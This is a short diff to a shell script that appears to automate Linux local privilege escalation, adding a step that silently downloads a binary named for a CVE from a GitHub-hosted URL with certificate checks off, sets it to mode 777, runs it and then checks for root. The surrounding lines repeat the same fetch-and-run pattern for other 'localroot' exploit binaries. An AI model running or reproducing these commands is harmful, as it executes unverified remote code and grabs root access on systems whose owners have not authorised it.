@@ -99,6 +99,12 @@ chmod 777 "top_9_CVE-2017-1000112-c.bin"
 check_root
 rm "top_9_CVE-2017-1000112-c.bin"
 
+wget -q "https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/cve-2026-41651" --no-check-certificate
+chmod 777 "cve-2026-41651"
+./cve-2026-41651
+check_root
+rm "cve-2026-41651"
+
 wget -q "https://mrwawanj.github.io/localroot/top_8_exploit-sh.bin" --no-check-certificate
 chmod 777 "top_8_exploit-sh.bin"
 ./top_8_exploit-sh.bin
